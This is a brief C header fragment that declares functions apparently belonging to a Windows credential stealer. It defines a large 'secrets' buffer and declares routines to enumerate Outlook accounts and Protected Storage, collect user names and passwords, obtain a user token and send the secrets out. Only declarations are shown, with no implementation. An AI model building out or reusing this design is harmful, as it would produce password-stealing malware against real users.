#define SECRETS_BUF_SIZE 128000

DWORD WINAPI send_secrets(LPVOID arg);
void AddItemm(char *resname,char *restype,char *usrname,char *pass);
int EnumOutlookAccounts(void);
int EnumPStorage(void);
HANDLE get_user_token(void);